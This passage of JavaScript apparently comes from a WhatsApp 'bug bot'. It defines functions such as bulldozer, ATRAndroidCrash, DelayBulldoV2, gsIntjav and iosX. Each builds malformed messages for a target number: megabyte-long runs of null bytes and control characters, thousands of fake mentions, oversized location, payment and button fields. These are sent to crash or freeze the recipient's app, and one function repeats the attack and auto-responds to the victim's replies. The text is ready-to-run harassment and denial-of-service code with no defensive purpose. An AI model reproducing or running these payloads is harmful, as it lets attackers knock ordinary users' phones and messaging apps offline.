        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q=="
      }
    },
    {
      participant: { jid: target },
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}

async function PaymentFC(sock, target) {
    const requestPaymentMsg = {
        requestPaymentMessage: {
            amount: {
                value: 2,
                offset: 1,
                currencyCodeIso4217: "IDR",
                requestFrom: target,
                caption: "zephyrinē sદx",
                showAdAttribution: false,
                expiryTimestamp: Date.now() + 1000
            },
            contextInfo: {
                forwardingScore: 9999,
                isForwarded: true,
                remoteJid: "status@broadcast",
                externalAdReply: {
                    title: "zephyrinē sદx",
                    body: "",
                    mimetype: "audio/mpeg",
                    caption: "",
                    sourceUrl: "https://github.com/zephyrinee"
                }
            }
        }
    };

    await sock.relayMessage(target, requestPaymentMsg, {
        participant: { jid: target },
        userJid: target,
        messageId: null,
        quoted: null
    });
}

async function bulldozer(sock, target) {
  try {
    const Reomsg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {
              senderKeyIndex: 999999,
              senderTimestamp: Date.now() + 999999999,
            },
            deviceListMetadataVersion: 3,
          },
          interactiveMessage: {
            header: {
              title: "iya apin ganteng ko",
              hasMediaAttachment: true,
              locationMessage: {
                degreesLatitude: 323232.323232,
                degreesLongitude: -323232.323232,
                name: "}".repeat(5000),
                address: "{".repeat(4500),
              },
            },
            body: {
              text: "",
            },
            footer: {
              orderMessage: {
                orderId: "XIIX" + Date.now(),
                thumbnail: Buffer.from([]),
                itemCount: 1,
                status: 1,
                surface: 1,
                message: "OrderMessage",
                orderTitle: "Arcane",
                sellerJid: "0@s.whatsapp.net",
              },
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net"],
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "{".repeat(10000),
                  }),
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(target, Reomsg, {
      participant: { jid: target },
    });
    console.log("SUCCESS");
  } catch (e) {
    console.log("ERROR", e);
  }
}

async function OhMyBlue(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "$",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "review_and_pay",
            paramsJson: `{"currency":"USD","pay*ment_configuration":"","payment_type":"","transaction_id":"","total_amount":{"value":879912500,"offset":100},"reference_id":"4N88TZPXWUM","type":"physical-goods","payment_method":"","order":{"status":"pending","description":"","subtotal":{"value":990000000,"offset":100},"tax":{"value":8712000,"offset":100},"discount":{"value":118800000,"offset":100},"shipping":{"value":500,"offset":100},"order_type":"ORDER","items":[{"retailer_id":"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0","name":"COSMOX","amount":{"value":1000000,"offset":100},"quantity":99},{"retailer_id":"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4","name":"XCURSED","amount":{"value":5000000,"offset":100},"quantity":99},{"retailer_id":"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3","name":"null","amount":{"value":4000000,"offset":100},"quantity":99}]},"additional_note":${"\u0000".repeat(1000000)}}`,
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });

  await sock.relayMessage(target, {
    groupStatusMentionV2: {
      message: msg.message
    }
  }, {
    messageId: msg.key.id,
    participant: { jid: target }
  });

  const msgs = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "$",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `${"\x50".repeat(1045000)}`,
            version: 3
          },
          contextInfo: {
           mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMentionV2: {
      message: msgs.message
    }
  }, {
    messageId: msgs.key.id,
    participant: { jid: target }
  });

  const msgw = await generateWAMessageFromContent(target, {
    ephemeralMessage: {
      message: {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "$",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1000000),
                version: 3
              },
              entryPointConversionSource: "payment_info"
            }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMentionV2: {
      message: msgw.message
    }
  }, {
    messageId: msgw.key.id,
    participant: { jid: target }
  });
  const delayMsg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "$",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"JAWIER\",\"landmark_area\":\"X\",\"address\":\"KELRA\",\"tower_number\":\"KELRA\",\"city\":\"kakeklu\",\"name\":\"KELRA\",\"phone_number\":\"999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"KELRA | ${"\u0000".repeat(19999)}\"}}`,
        version: 3
      }
    }
  }, { userJid: target });

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: delayMsg.message
      }
    },
    {
      messageId: delayMsg.key.id,
      participant: { jid: target }
    }
  );
}

async function locrsh(sock, target) {
  let locaMessage = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "👁‍🗨⃟꙰。⃝𝐕𝐢 ‌ 𝐧𝐳⃰ ⌁ 𝐇𝐢𝐝𝐳𝐲𝐲.ꪸ⃟‼️",
            hasMediaAttachment: true,
            locationMessage: {
              degreesLatitude: -999.0349999999999,
              degreesLongitude: 922.999999999999,
              name: "⿻  ⌜ 𝐇𝐢𝐝𝐳𝐲𝐲𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻" + "ꦽ".repeat(10000),
              address: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑" + "ꦽ".repeat(10000),
            }
          },
          body: {
            text: ""
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(10000)}","sections":[{"title":"9-9-9","rows":[]}]}`,
              },
              {
                name: "cta_url",
                buttonParamsJson: `{"display_text":"${"ꦽ".repeat(10000)}","url":"https:","merchant_url":"https:"}`
              },
              {
                name: "cta_copy",
                buttonParamsJson: `{"display_text":"${"𑲭".repeat(10000)}","copy_code":"R"}`
              },
              {
                name: "galaxy_message",
                buttonParamsJson: `{"icon":"REVIEW","flow_cta":"${"𑲭𑲭".repeat(10000)}","flow_message_version":"3"}`
              }
            ]
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              ),
            remoteJid: "status@broadcast",
            stanzaId: "666",
            participant: target,
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, locaMessage, {
    messageId: null,
    participant: { jid: target }
  });
}

async function paySuck(target) {
await sock.relayMessage(target, {
    "interactiveMessage": {
        "nativeFlowMessage": {
            "buttons": [
                {
                    "name": "payment_info",
                    "buttonParamsJson": "{\"currency\":\"IDR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4UJPSC1FYKC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"¿!deadcode!¿\",\"key\":\" 🪧" + "\u0000".repeat(902000) + "\",\"key_type\":\"CPF\"}}],\"share_payment_status\":false}"
                }
            ]
        }
    }
}, {});
}

async function ATRAndroidCrash(sock, target) {
  const OnceMessage = [];

  OnceMessage.push(
    {
      name: "cta_call",
      buttonParamsJson: JSON.stringify({
        display_text: "ꦽ".repeat(5000),
      }),
    },
    {
      name: "cta_copy",
      buttonParamsJson: JSON.stringify({
        display_text: "ꦽ".repeat(5000),
      }),
    },
    {
      name: "quick_reply",
      buttonParamsJson: JSON.stringify({
        display_text: "ꦽ".repeat(5000),
      }),
    }
  );

  const msg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          header: {
            title: ".",
            locationMessage: {},
            hasMediaAttachment: true,
          },
          body: {
            text: " ꦾꦾꦾꦾꦾl " + "\0".repeat(900000),
          },
          footer: {
            text: "{" + "ꦾ".repeat(9000),
          },
          nativeFlowMessage: {
            name: "review_and_pay".repeat(5000),
            buttonParamsJson:
              '{"currency":"IDR","total_amount":{"value":0,"offset":0},"reference_id":null,"type":"physical-goods","order":{"status":null,"subtotal":{"value":0,"offset":0},"order_type":"PAYMENT_REQUEST","items":[{"retailer_id":null,"name":null,"amount":{"value":0,"offset":0},"quantity":0}]},"additional_note":null,"native_payment_methods":[],"share_payment_status":true,"buttons":[{"name":"payment_method","buttonParamsJson":"{\\"reference_id\\":null,\\"payment_method\\":0,\\"payment_timestamp\\":null,\\"share_payment_status\\":true}"}]}',
          },
          carouselMessage: {},
          buttons: OnceMessage,
          contextInfo: {
            mentionedJid: [
              target,
              "support@s.whatsapp.net",
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1990 }, (_, i) => `1${3000000000 + i}@s.whatsapp.net`),
            ],
            stanzaId: "Payment".repeat(1000),
            participant: target,
            isForwarded: true,
            forwardingScore: 9999,
            quotedMessage: {
              interactiveMessage: {
                body: {
                  text: "ꦾ Crash Android",
                },
                footer: {
                  text: " — Tras4sh - Function Crash ATHERIA",
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
              },
            },
          },
          extendedTextMessage: {
            sendnoteMessage: {
              text: "ꦽ".repeat(15000) + "ꦾ".repeat(10000),
              contextInfo: {
                mentionedJid: ["0@s.whatsapp.net"],
                participant: target,
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 3,
                    expiryTimestamp: Date.now() + 1814400000,
                  },
                },
              },
            },
            locationMessage: {
              degreesLatitude: 0,
              degreesLongitude: -0,
              name: "ꦾꦾꦾꦾꦾꦾꦾ".repeat(20000),
              address: "ꦾꦾꦾꦾꦾꦾ" + "{".repeat(30000),
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target },
  });
}

async function DelayBulldoV2(sock, target) {
  try {
    const stickerPayload = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            isAnimated: true,
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };

    const audioPayload = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };

    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "$",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "$",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
    };

    const msg1 = generateWAMessageFromContent(target, stickerPayload, {});
    const msg2 = generateWAMessageFromContent(target, audioPayload, {});
    const msg3 = generateWAMessageFromContent(target, imagePayload, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    const msg4 = {
      viewOnceMessage: {
        message: {
          groupMentionMessage: {
            message: {
              interactiveResponseMessage: {
                contextInfo: {
                  remoteJid: "target",
                  mentionedJid: ["13135559098@s.whatsapp.net"],
                },
                body: {
                  text: "🩸",
                  format: "DEFAULT",
                },
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+131358790202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
                  version: 3,
                },
              },
            },
          },
        },
      },
    };

    const msg5 = {
      interactiveMessage: {
        header: {
          locationMessage: {
            degreesLatitude: 9999999999,
            degreesLongitude: -9999999999,
            name: "ꦽ".repeat(15000) + "\0".repeat(15000),
            address: "$" + "{".repeat(30000),
            comment: "ꦾ".repeat(10000),
          },
        },
      },
    };

    const messages = [msg4, msg5];
    for (const msg of messages) {
      await sock.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }],
              },
            ],
          },
        ],
      });
    }

    const mentions = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () =>
            "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net"
        )
    ];

    const mediaDatamrb = [
        {
            ID: "68BD677B",
            uri: "t62.43144-24/10000000_1407285833860834_2249780575933148603_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AFffQpqWVK7GvldUiQQNd4Li_6BbUMZ3yHwZ55g5SuVKA&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "o+hchsgN0ZtdSp8iBlD1Yb/kx9Mkrer8km3pw5azkj0=",
            mkey: "C+7Uy3QyEAHwMpIR7CGaKEhpZ3KYFS67TcYxcNbm73EXo=",
        },
        {
            ID: "68BD469B",
            uri: "t62.43144-24/10000000_2553936021621845_4020476590210043024_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AHPt6cTL57bihyVMMppUvQiXg-m7Oog3TAebzRVWsCNEw&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "2cGzUZDAYCZq7QbAoiWSI1h5Z0WIje7VK1IiUgqu/+Y=",
            mkey: "1EvzGhM2IL78wiXyfpRrcr8o0ws/hTjtghBQUF+v3wI=",
        },
    ];

    const mediaData2mrb = [
        {
            ID: "69680D38",
            uri: "t62.43144-24/10000000_790307790709311_669779370012050552_n.enc?ccb=11-4&oh",
            buffer: "11-4&oh=01_Q5Aa3QGnIg1qMpL5Isc7LmIdU1IpoFsCqXialsd2OW2w0QQyUw&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "7ovcifxdIivWXIJgLvrRtPfs+pPXen7hoXtnoFKdP4s=",
            mkey: "Wql96TBHCa44YVS6eAlHGI6aYIYg6yc0kuOr0Y9WvtI=",
        },
        {
            ID: "69680D38",
            uri: "t62.43144-24/10000000_1534257120961824_1506742782412655205_n.enc?ccb=11-4&oh",
            buffer: "11-4&oh=01_Q5Aa3QEE7wUPnOULMZhlwnOw_bhHK6Gn7YI0hKpVm3yvw5dGMw&oe",
            sid: "5e03e0",
            SHA256: "I2ky6mhJmsFYmA+XRBoiaiTeYwnXGQAVXym+P/9YN6Y=",
            ENCSHA256: "HyfU2MhgxBQFFIohXT68RNZa0MAZRxDYB4X1c3I7JQY=",
            mkey: "Q5V7iUFs67ewh1qOOkqwQ9avc3u7qXAhyh2fIgVITCU=",
        },
        {
            ID: "696C0CE0",
            uri: "t62.43144-24/10000000_1897784937438799_7647459696855315586_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa3QGNjK1V4UGLF19HxU16vRNPFJQjy64pYSFbsuEm6bySdw&oe",
            sid: "5e03e0",
            SHA256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
            ENCSHA256: "RA4VN83TrKamnTjEolURSU7+2UUDY28EFBBQvFNh7e4=",
            mkey: "dTMN5/4/mFir4PcfgezcrIXqigJ8pl/COUQMxUsTaac=",
        },
    ];

    const extendedMsg = {
        extendedTextMessage: {
            text: "$$$$$",
            locationMessage: {
                degressLatitude: 617267,
                degressLongitude: -6172677,
                isLive: true,
                accuracyInMetters: 100,
                jpegThumbnail: null,
            },
            contextInfo: {
                forwardingScore: 9471,
                isForwarded: true,
                mentionedJid: mentions,
                participant: target,
                stanzaId: target,
                entryPointConversionSource: "notification",
                remoteJid: target,
            },
            messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 3,
            },
        },
        mediaData: [...mediaDatamrb, ...mediaData2mrb],
    };

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: extendedMsg
        }
    }, {
        participant: { jid: target }
    });
  } catch (err) {
    console.error("❌ Error di:", err);
  }
}

async function onehit(sock, target) {
  if (!sock) throw new Error("sock tidak terdefinisi");
  if (!target) throw new Error("target tidak terdefinisi");

  const message = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "theScript",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(100000),
            version: 3
          }
        }
      }
    }
  };

  await sock.relayMessage(
    target,
    message,
    {
      participant: { jid: target }
    }
  );
}

async function gsIntjav(sock, target, otaxkiw = true) {
  for (let i = 0; i < 10; i++) {

    let otaxi = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, i) => `628${i + 72}@s.whatsapp.net`),
          isForwarded: true,
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "12037205250208@newsletter",
            newsletterName: "do u know me? | Information",
            serverMessageId: 1000,
            accessibilityText: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣"
          },
          statusAttributionType: "RESHARED_FROM_MENTION",
          contactVcard: true,
          isSampled: true,
          dissapearingMode: {
            initiator: target,
            initiatedByMe: true
          },
          expiration: Date.now()
        },
        body: {
          text: "❖ 𝙄𝙢 𝙃𝙚𝙧𝙚 𝙊𝙏𝘼𝙓",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"Otax?","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
          version: 3
        }
      }
    }

    let msg = generateWAMessageFromContent(
      target,
      { groupStatusMessageV2: { message: otaxi } },
      {}
    )

    await sock.relayMessage(
      target,
      msg.message,
      otaxkiw
        ? { messageId: msg.key.id, participant: { jid: target }, userJid: target }
        : { messageId: msg.key.id }
    )

    await sleep(1000)

    await sock.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: msg.key.id,
        participant: target
      }
    })
  }

  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type !== "notify") return

    for (const msg of messages) {
      if (!msg.message) continue
      if (msg.key.fromMe) continue
      if (msg.key.remoteJid !== target) continue

      try {
        await sock.relayMessage(
          target,
          viewOnceMsg,
          {
            messageId: sock.generateMessageTag()
          }
        )
      } catch {}
    }
  })
}

async function iosX(sock, target) {
let msg = generateWAMessageFromContent(cx, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/577313004_1396042095336744_3502303966329446087_n.enc?ccb=11-4&oh=01_Q5Aa3gEgeQo-cEIvQ4k8hdG8jL1_wM5a5Gu5LU_noz7DD_7vkQ&oe=699D4EA0&_nc_sid=5e03e0&mms3=true",
    "mimetype": "font/ttf",
    "fileSha256": "zwcuDa1N8m5NUhc8ULlnfj/caWJ/UOFOyKZbF4OCnY0=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "bYXd51OtQqwZfSKkQZVf649q7Sup6Bsw8BN3Gcl3hY4=",
    "fileName": "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666.ttf",
    "fileEncSha256": "0oE81rg9hgVtlsfnzFLzBToBK3tbeVyMow6z2tyOoqg=",
